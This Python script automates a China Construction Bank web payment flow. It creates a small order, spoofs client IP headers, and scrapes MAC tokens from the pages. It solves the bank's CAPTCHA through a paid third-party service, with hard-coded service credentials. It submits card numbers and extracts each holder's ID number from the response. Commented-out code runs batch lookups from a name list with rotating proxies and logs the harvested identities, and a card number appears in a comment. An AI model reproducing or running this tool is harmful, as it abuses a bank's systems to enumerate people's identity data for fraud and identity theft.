import time
from hashlib import md5

import requests
import re


class Chaojiying_Client(object):

    def __init__(self, username, password, soft_id):
        self.username = username
        password = password.encode('utf8')
        self.password = md5(password).hexdigest()
        self.soft_id = soft_id
        self.base_params = {
            'user': self.username,
            'pass2': self.password,
            'softid': self.soft_id,
        }
        self.headers = {
            'Connection': 'Keep-Alive',
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)',
        }

    def PostPic(self, im, codetype):
        """
        im: 图片字节
        codetype: 题目类型 参考 http://www.chaojiying.com/price.html
        """
        params = {
            'codetype': codetype,
        }
        params.update(self.base_params)
        files = {'userfile': ('ccc.jpg', im)}
        r = requests.post('http://upload.chaojiying.net/Upload/Processing.php', data=params, files=files,
                          headers=self.headers)
        return r.json()

    def PostPic_base64(self, base64_str, codetype):
        """
        im: 图片字节
        codetype: 题目类型 参考 http://www.chaojiying.com/price.html
        """
        params = {
            'codetype': codetype,
            'file_base64': base64_str
        }
        params.update(self.base_params)
        r = requests.post('http://upload.chaojiying.net/Upload/Processing.php', data=params, headers=self.headers)
        return r.json()

    def ReportError(self, im_id):
        """
        im_id:报错题目的图片ID
        """
        params = {
            'id': im_id,
        }
        params.update(self.base_params)
        r = requests.post('http://upload.chaojiying.net/Upload/ReportError.php', data=params, headers=self.headers)
        return r.json()

# def new_set_proxy(session):
#
#     resp = requests.get(
#         "http://http.tiqu.letecs.com/getip3?num=1&type=2&pro=&city=0&yys=0&port=11&time=1&ts=0&ys=0&cs=0&lb=1&sb=0&pb=4&mr=1&regions=&gm=4"
#     )
#     resp = resp.json()
#     # 代理服务器
#     ip = resp["data"][0]["ip"]
#     port = resp["data"][0]["port"]
#     print(ip, port)
#     proxyMeta = "http://%(host)s:%(port)s" % {
#         "host": ip,
#         "port": port,
#     }
#     proxies = {
#         "http": proxyMeta,
#         "https": proxyMeta
#     }
#     session.proxies = proxies
#     return ip,port,session

# def old_set_proxy(ip,port,session):
#     proxyMeta = "http://%(host)s:%(port)s" % {
#         "host": ip,
#         "port": port,
#     }
#     print(ip, port)
#     proxies = {
#         "http": proxyMeta,
#         "https": proxyMeta
#     }
#     session.proxies = proxies



def orderPay(session):
    orderPay_url = "https://cloud.life.ccb.com/order/orderPay_m.jhtml"

    headers1 = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
        'X-Forwarded-For': '1.116.127.11'
    }

    data1 = {
        "timeout": "10000",
        "wechatPaymentChannel": "",
        "allBillId": "T000103005|",
        "unpaidInfo": "{T000103005,1,[0189325819:1],0189325819}",
        "INOU_ITM_NO": "C6F6465919E64A92",
        "BILL_CODE": "08AABF16BCBE3028CC6AAFCD6A13F2AE",
        "PLATFORM": "Android_new",
        "allLoginInfo": "6ZWH5rW35a+66ZqP57yY5o2QfA==",
        "channel": "7",
        "isWechat": "true",
        "isMobile": "0",
        "isPortalMoblie": "false",
        "isfinance": "",
        "savePaymentType": "00",
        "savePayMapFlag": "00",
        "aggregatePaymentsSwitch": "01",
        "billType": "01",
        "billMerchant": "213069606310000",
        "loginInfoInput": "YWFh",
        "isSearchBills": "",
        "allLoginInfoInput": "YWFhfA==",
        "displayInputValsStr": "",
        "blankDisplayCiiBillIdsStr": "",
        "groupId": "1000000000001",
        "realAuthMsg": "",
        "markLoginInfo": "",
        "familyPaymentFlag": "",
        "version": "",
        "isPartyWechatGK": "",
        "familyShareType": "",
        "familyShareCloudIds": "",
        "outPutId": "",
        "isAliPayFlag": "00",
        "isLoongPayNewGatewayChecked": "false",
        "isLoongPayNewGatewayFlat": "true"
    }
    session.headers.update(headers1)
    resp1 = session.post(orderPay_url, headers=headers1, data=data1,timeout=5)
    response_data = resp1.json()['prInfo']
    return response_data

def post_mac2(session,prInfo):
    # 以下是拿mac2的代码
    B2CMainPlatP1_url = 'https://ibsbjstar.ccb.com.cn/CCBIS/B2CMainPlatP1'
    cookies = session.cookies.get_dict()
    headers2 = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 NetType/WIFI MicroMessenger/7.0.20.1781(0x6700143B) WindowsWechat(0x6309021a) XWEB/6763',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://cloud.life.ccb.com',
        'Referer': 'https://cloud.life.ccb.com/',

    }
    data2 = {
        'CCB_IBSVersion': 'V6',
        'NETUSER_ID': prInfo['NETUSER_ID'],
        'INOU_ITM_NO': '80011',
        'MERCHANTID': '105910000376906',
        'POSID': prInfo['POSID'],
        'BRANCHID': '310000000',
        'ORDERID': prInfo['ORDERID'],
        'PAYMENT': '1',
        'CURCODE': '01',
        'REMARK1': prInfo['REMARK1'],
        'REMARK2': '',
        'TXCODE': '522100',
        'TXFLAG': '5',
        'MAC': prInfo['MAC'],
        'CLIENTIP': '',
        'REGINFO': '',
        'PROINFO': '%u5584%u6B3E',
        'USERPARAM': '',
        'EXTPARAM': 'A00C8A60B8CD23FD28A8E130872EE867B5B50D98195E96B3FD08EA9BCBAEB59A3D6A644A844C943C700B154EB5BDB69A1C61BC5646D20E686C1B2CC2A87D31D11AEF3B66D3A97377E27F26C99B294880',
        'VIEW_FLAG': '1',
        'PAYMAP': '0000000000',
        'TIMEOUT': prInfo['TIMEOUT'],
    }

    response = session.post(B2CMainPlatP1_url, headers=headers2, data=data2, cookies=cookies)
    if "403 Forbidden" in response.text:
        print("403:"+ B2CMainPlatP1_url )
    session.cookies.update(session.cookies)
    return response

def get_mac2(resp):
    match = re.search(r'<input type="hidden" name="MAC" value="(\w+)">', resp.text)
    MAC = match.group(1)
    payload = {}

    pattern = r'<input.*?name="([^"]*)".*?value="([^"]*)".*?>'
    matches = re.findall(pattern, resp.text)

    for name, value in matches:
        payload[name] = value

    return MAC, payload

def get_num(session,cookies,payload):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/98.0.4758.102 Safari/537.36 NetType/WIFI MicroMessenger/7.0.20.1781(0x6700143B) "
                      "WindowsWechat(0x6309021a) XWEB/6763",
        "Referer": "https://ibsbjstar.ccb.com.cn/CCBIS/B2CMainPlatP1",
        'X-Forwarded-For': '1.116.189.11'
    }

    response = session.post(url='https://ibsbjstar.ccb.com.cn/CCBIS/ccbMain', headers=headers, data=payload,
                            cookies=cookies)
    session.headers.update(headers)
    response_text = response.text
    match_obj = re.search(r'action=\'(.*?)\'', response_text)
    url = match_obj.group(1)
    match = re.search(r'_([0-9]{2})_', url)
    num = match.group(1)
    session.post(url=url, headers=headers, cookies=cookies)
    session.cookies.update(session.cookies)
    return num

def code(cookies,num,session):
    url = f'https://ibsbjstar.ccb.com.cn/CCBIS/B2CMainPlat_{num}_EPAY?SERVLET_NAME=B2CMainPlat_{num}_EPAY&CCB_IBSVersion=V6' \
          '&PT_STYLE=1&TXCODE=100119&USERID=&SKEY='
    a1 = session.post(url, cookies=cookies).text
    a1 = a1.strip()  # 去掉换行符
    url = f'https://ibsbjstar.ccb.com.cn/NCCB_Encoder/Encoder?CODE={a1}'
    response = session.get(url, cookies=cookies)
    with open('image.jpg', 'wb') as f:
        f.write(response.content)
    chaojiying = Chaojiying_Client('nashor', 'Lpl2003zed', '948434')  # 用户中心>>软件ID 生成一个替换 96001
    im = open('image.jpg', 'rb').read()  # 本地图片文件路径 来替换 a.jpg 有时WIN系统须要//
    orc = chaojiying.PostPic(im, 1005)
    print(orc)
    # 用json解析返回的数据
    code1 = orc['pic_str']
    return code1

def final(idcard,cookies,num,session,code1,prInfo,MAC):
    # 下面是构造支付请求
    url = f"https://ibsbjstar.ccb.com.cn/CCBIS/B2CMainPlat_{num}_EPAY?CCB_IBSVersion=V6"

    headers = {
        "Cookie": f"CCBMAC={cookies['CCBMAC']}; "
                  f"CCBIBS1={cookies['CCBIBS1']};",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://ibsbjstar.ccb.com.cn",

        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/98.0.4758.102 Safari/537.36 NetType/WIFI MicroMessenger/7.0.20.1781(0x6700143B) '
                      'WindowsWechat(0x6309021a) XWEB/6763',
    }
    data = {
        "ACCOUNT": idcard,
        "PT_CONFIRM_PWD": code1,
        "TXCODE": "410328",
        "BRANCHID": "310000000",
        "CURCODE": "01",
        "MAC": MAC,
        "MERCHANTID": "105910000376906",
        "ORDERID": prInfo['ORDERID'],
        "PAYMENT": "1",
        "POSID": "023374578",
        "TIMEOUT": prInfo['TIMEOUT'],
        "THIRDAPPINFO": "comccbpay105320148140002alipay"
    }
    response = session.post(url, headers=headers, data=data, cookies=cookies)
    # print(response.text)
    pattern = r"var\s+idNum\s+=\s+'(\d+)'"

    idNum = re.search(pattern, response.text)
    return str(idNum.group(1))


# def get_mobile(ACCOUNT, NUMID,session):
#     import mobile
#     mobile_phone = mobile.mobile_main(ACCOUNT, NUMID ,session)
#     if mobile_phone == None:
#         return None
#     return mobile_phone

def main(idcard):
    with requests.Session() as session:
        try:
            time.sleep(4)
            prInfo = orderPay(session)
            resp2 = post_mac2(session,prInfo)
            MAC, payload = get_mac2(resp2)
            cookies = session.cookies.get_dict()
            num = get_num(session,cookies,payload)
            # 下面是获取验证码
            code1 = code(cookies,num,session)
            cookies = session.cookies.get_dict()
            idNum = final(idcard,cookies,num,session,code1,prInfo,MAC)
            # idNum_4 = idNum[-4:]
            final_str = f"{idcard}----idNum:{idNum}"
            print(final_str)
            session.close()
            return final_str
            # mobile_phone = get_mobile(idcard, idNum_4)
            # final_str = final_str + f"----phoneNum：{mobile_phone}\n"
            # print(final_str)
        except:
            final_str = f"{idcard}+查询失败！"
            session.close()
            return final_str




# if __name__ == '__main__':
    # main('6214670180016387714')
    # type_ = input("选择：\n"
    #               "1、单个查询\n"
    #               "2、批量查询\n")
    # if type_ == '1':
    #     print("输入参照以下格式：\n"
    #           "张三----1231231231231231231\n")
    #     while True:
    #         try:
    #             while True:
    #                 i = input("输入对应信息：\n")
    #                 print("正在查询，请稍后...")
    #                 i = i.strip()
    #                 pattern = r'\d+$'
    #                 idcard = re.search(pattern, i)
    #                 idcard = idcard.group()
    #                 with requests.Session() as session:
    #                     try:
    #                         prInfo = orderPay(session)
    #                         resp2 = post_mac2()
    #                         MAC, payload = get_mac2(resp2)
    #                         cookies = session.cookies.get_dict()
    #                         num = get_num()
    #                         # 下面是获取验证码
    #                         code1 = code(cookies)
    #                         cookies = session.cookies.get_dict()
    #                         idNum = final(idcard)
    #                         idNum_4 = idNum[-4:]
    #                         final_str = f"{i}----idNum:{idNum}"
    #                         print(final_str)
    #                         session.close()
    #                         # mobile_phone = get_mobile(idcard, idNum_4)
    #                         # final_str = final_str + f"----phoneNum：{mobile_phone}\n"
    #                         print(final_str)
    #
    #                         exit = input("输入exit退出，回车键继续查询：\n")
    #                         if exit == 'exit':
    #                             break
    #                     except Exception as e:
    #                         print(e)
    #                         print("查询失败，请重试！")
    #                         continue
    #         except Exception as e:
    #             print(e)
    #             print("查询失败，请重试！")
    #             continue
    #
    #
    #
    # else:
    #
    #     input("下面是批量查询的使用方法：\n"
    #           "将需要查询的身份证号码放入当前目录下的1.txt文件中，每行一个\n"
    #           "格式如下：\n"
    #           "张三----123456789012345678\n"
    #           "如果准备好了，请按回车键开始使用：\n")
    #
    #     list1 = []
    #     with open('1.txt', 'r', encoding='utf-8') as f:
    #         a = f.readlines()
    #         for i in a:
    #             i = i.strip()
    #             pattern = r'\d+$'
    #             idcard = re.search(pattern, i)
    #             idcard = idcard.group()
    #             try:
    #                 with requests.Session() as session:
    #                     try:
    #                         # ip,port,session = new_set_proxy(session)
    #                         prInfo = orderPay(session)
    #                         resp2 = post_mac2()
    #                         MAC, payload = get_mac2(resp2)
    #                         cookies = session.cookies.get_dict()
    #                         num = get_num()
    #                         # 下面是获取验证码
    #                         code1 = code(cookies)
    #                         cookies = session.cookies.get_dict()
    #                         idNum = final(idcard)
    #                         # idNum_4 = idNum[-4:]
    #                         final_str = f"{i}----idNum:{idNum}\n"
    #                         print(final_str)
    #                         session.close()
    #                         with open("success.txt", "a", encoding='utf-8') as f:
    #                             f.write(final_str)
    #
    #                         # with requests.Session() as session:
    #                         #     old_set_proxy(ip,port,session)
    #                             # mobile_phone = get_mobile(idcard, idNum_4,session)
    #                             # final_str = final_str + f"----phoneNum：{mobile_phone}\n"
    #                             # print(final_str)
    #                             # with open("success.txt", "a", encoding='utf-8') as f:
    #                             #     f.write(final_str)
    #                     except Exception as e:
    #                         final_str = f"{i}\n"
    #                         print(f"{i}----查询失败\n")
    #                         with open("fail.txt", "a", encoding='utf-8') as f:
    #                             f.write(final_str)
    #
    #             except Exception as e:
    #                 idNum = final(idcard)
    #                 final_str = f"{i}----idNum:{idNum}\n"
    #                 print(f"{i}----idNum:{idNum}----查询失败\n")
    #                 with open("fail.txt", "a", encoding='utf-8') as f:
    #                     f.write(final_str)
